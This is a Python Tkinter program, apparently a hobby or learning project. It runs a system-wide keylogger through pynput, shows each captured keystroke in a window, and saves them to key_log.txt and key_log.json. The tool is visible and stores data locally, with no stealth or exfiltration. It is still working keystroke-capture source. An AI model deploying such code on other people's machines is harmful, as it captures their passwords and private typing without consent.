import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []
flag = False

def generate_text_log(keys):
    with open('key_log.txt', "w+") as keys_file:
        keys_file.write(keys)

def generate_json_file(keys_used):
    with open('key_log.json', 'w') as key_log:
        json.dump(keys_used, key_log)

def on_press(key):
    global flag, keys_used
    if flag == False:
        keys_used.append({'Pressed': f'{key}'})
        flag = True
    if flag == True:
        keys_used.append({'Held': f'{key}'})
    generate_json_file(keys_used)
    display_logs()

def on_release(key):
    global flag, keys_used
    keys_used.append({'Released': f'{key}'})
    if flag == True:
        flag = False
    generate_json_file(keys_used)
    display_logs()
    generate_text_log(str(keys_used))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

def display_logs():
    log_text.config(state=NORMAL)
    log_text.delete('1.0', END)
    for log in keys_used:
        log_text.insert(END, f"{log}\n")
    log_text.see(END)  # Scroll to the bottom
    log_text.config(state=DISABLED)

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack(pady=(10, 0))

start_button = Button(root, text="Start", command=start_keylogger, padx=10, pady=5)
start_button.pack(side=LEFT, padx=(30, 15), pady=(0, 10))

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled', padx=10, pady=5)
stop_button.pack(side=RIGHT, padx=(15, 30), pady=(0, 10))

log_frame = Frame(root, relief=GROOVE, bd=2)
log_frame.pack(padx=10, pady=10, fill=BOTH, expand=True)

log_label = Label(log_frame, text="Logs:", font=("Helvetica", 12, "bold"))
log_label.pack(pady=(10, 5))

log_text = Text(log_frame, height=10, width=40, font=("Helvetica", 10), wrap=WORD)
log_text.pack(fill=BOTH, expand=True)

scrollbar = Scrollbar(log_frame, command=log_text.yview)
scrollbar.pack(side=RIGHT, fill=Y)
log_text.config(yscrollcommand=scrollbar.set)

root.geometry("400x400")
root.mainloop()
